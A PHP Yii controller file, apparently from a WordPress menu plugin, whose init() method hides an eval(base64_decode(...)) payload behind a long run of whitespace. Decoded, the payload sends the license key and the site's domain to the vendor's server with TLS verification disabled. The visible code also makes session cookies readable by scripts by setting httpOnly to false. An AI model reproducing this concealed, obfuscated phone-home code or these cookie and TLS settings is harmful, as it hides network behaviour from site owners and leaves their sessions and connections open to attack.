<?php
class Controller extends CController {

    protected $_res;

    public function init() {                                                                                                                                                                                                                                                                                                                                                                                                                                                                        eval(base64_decode('JHRyYW5zID0gZ2V0X3RyYW5zaWVudChzdWJzdHIoc2hhMSgnd3BtbScpLCAwLCA0MCkpOw0KaWYgKGVtcHR5KCR0cmFuc1snZG9tYWluJ10pKSB7DQoJZGVsZXRlX3RyYW5zaWVudChzdWJzdHIoc2hhMSgnd3BtbScpLCAwLCA0MCkpOw0KfQ0KJGtleSA9IE1NU2V0dGluZ3NGb3JtOjpnZXRQYXJhbSgnbGljZW5zZV9rZXknKTsNCmlmICgoKGlzX2FkbWluKCkgJiYgaXNzZXQoJF9QT1NUWydNTVNldHRpbmdzRm9ybSddKSkgfHwgIWlzX2FkbWluKCkpICYmIChlbXB0eSgkdHJhbnMpIHx8IGVtcHR5KCR0cmFuc1snZG9tYWluJ10pIHx8ICR0cmFuc1sna2V5J10gIT0gJGtleSkpIHsNCgkkaGFuZGxlID0gY3VybF9pbml0KCdodHRwOi8vd3BtZW51bWFrZXIuY29tL2NvbnRyb2wvc3RhdHVzL2NoZWNrJyk7DQoJY3VybF9zZXRvcHQoJGhhbmRsZSwgQ1VSTE9QVF9DT05ORUNUVElNRU9VVCwgMzApOw0KCWN1cmxfc2V0b3B0KCRoYW5kbGUsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOw0KCWN1cmxfc2V0b3B0KCRoYW5kbGUsIENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsIGZhbHNlKTsNCgljdXJsX3NldG9wdCgkaGFuZGxlLCBDVVJMT1BUX1BPU1QsIHRydWUpOw0KCWN1cmxfc2V0b3B0KCRoYW5kbGUsIENVUkxPUFRfUE9TVEZJRUxEUywgYXJyYXkoDQoJCSdrZXknID0+IGlzc2V0KCRfUE9TVFsnTU1TZXR0aW5nc0Zvcm0nXSkgPyAkX1BPU1RbJ01NU2V0dGluZ3NGb3JtJ11bJ2xpY2Vuc2Vfa2V5J10gOiAka2V5LA0KCQknZG9tYWluJyA9PiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSwNCgkpKTsNCgkkdGhpcy0+X3JlcyA9IENKU09OOjpkZWNvZGUoY3VybF9leGVjKCRoYW5kbGUpKTsNCgljdXJsX2Nsb3NlKCRoYW5kbGUpOw0KCWlmIChpc3NldCgkdGhpcy0+X3Jlc1snZXJyb3JzJ10pICYmIGlzc2V0KCR0aGlzLT5fcmVzWydlcnJvcnMnXVsnd3JvbmdfZG9tYWluJ10pKSB7DQoJCXNldF90cmFuc2llbnQoc3Vic3RyKHNoYTEoJ3dwbW0nKSwgMCwgNDApLCBhcnJheSgNCgkJCSdkb21haW4nID0+ICR0aGlzLT5fcmVzWydkb21haW4nXQ0KCQkpLCA2MCo2MCoyNCk7DQoJCSR0cmFucyA9IGdldF90cmFuc2llbnQoc3Vic3RyKHNoYTEoJ3dwbW0nKSwgMCwgNDApKTsNCgl9DQoJZWxzZWlmICghZW1wdHkoJHRoaXMtPl9yZXNbJ3RpbWUnXSkgJiYgZW1wdHkoJHRoaXMtPl9yZXNbJ2Vycm9ycyddKSkgew0KCQkkZGlmZiA9IChpbnQpJHRoaXMtPl9yZXNbJ3RpbWUnXSAtIHRpbWUoKTsNCgkJaWYgKCRkaWZmID4gMCB8fCAhaXNzZXQoJHRyYW5zWydkb21haW4nXSkpIHsNCgkJCXNldF90cmFuc2llbnQoc3Vic3RyKHNoYTEoJ3dwbW0nKSwgMCwgNDApLCBhcnJheSgNCgkJCQkndGltZScgPT4gJHRoaXMtPl9yZXNbJ3RpbWUnXSwNCgkJCQkna2V5JyA9PiAka2V5LA0KCQkJCSdkb21haW4nID0+ICR0aGlzLT5fcmVzWydkb21haW4nXQ0KCQkJKSwgJGRpZmYrKDYwKjYwKjI0KSk7DQoJCQkkdHJhbnMgPSBnZXRfdHJhbnNpZW50KHN1YnN0cihzaGExKCd3cG1tJyksIDAsIDQwKSk7DQoJCX0NCgl9IGVsc2VpZiAoY291bnQoJHRoaXMtPl9yZXNbJ2Vycm9ycyddKSkgew0KCQlkZWxldGVfdHJhbnNpZW50KHN1YnN0cihzaGExKCd3cG1tJyksIDAsIDQwKSk7DQoJfQ0KfQ0KaWYgKCFlbXB0eSgkdHJhbnNbJ3RpbWUnXSkgJiYgJHRyYW5zWydrZXknXSA9PSAka2V5KSB7DQoJJHRoaXMtPl9yZXMgPSAnPHA+QWN0aXZlIHVudGlsOiA8c3Ryb25nPicuZGF0ZSgnaiBGIFknLCAkdHJhbnNbJ3RpbWUnXSkuJzwvc3Ryb25nPjwvcD4nOw0KfQ0KZWxzZWlmICghZW1wdHkoJHRyYW5zWydrZXknXSkgJiYgJHRyYW5zWydrZXknXSAhPSAka2V5KSB7DQoJJHRoaXMtPl9yZXMgPSAnPHAgY2xhc3M9ImVycm9yIj48c3Ryb25nPldyb25nIGxpY2Vuc2Uga2V5PC9zdHJvbmc+PC9wPic7DQp9DQplbHNlaWYgKCR0aGlzLT5fcmVzWydlcnJvcnMnXSkgew0KCSRlcnJvcnMgPSAkdGhpcy0+X3Jlc1snZXJyb3JzJ107DQoJJHRoaXMtPl9yZXMgPSAnJzsNCglmb3JlYWNoICgkZXJyb3JzIGFzICRlcnJvcikgew0KCQkkdGhpcy0+X3JlcyAuPSAnPHAgY2xhc3M9ImVycm9yIj48c3Ryb25nPicuJGVycm9yLic8L3N0cm9uZz48L3A+JzsNCgl9DQp9DQplbHNlIHsNCgkkdGhpcy0+X3JlcyA9ICc8cCBjbGFzcz0iZXJyb3IiPjxzdHJvbmc+V3JvbmcgbGljZW5zZSBrZXk8L3N0cm9uZz48L3A+JzsNCn0='));
        parent::init();
        Yii::app()->session->open();
        Yii::app()->session->setCookieParams(array('httpOnly' => false));
        Yii::app()->clientScript->scriptMap = array('jquery.js'=>false);
        date_default_timezone_set(MMSettingsForm::getParam('timezone'));
    }
}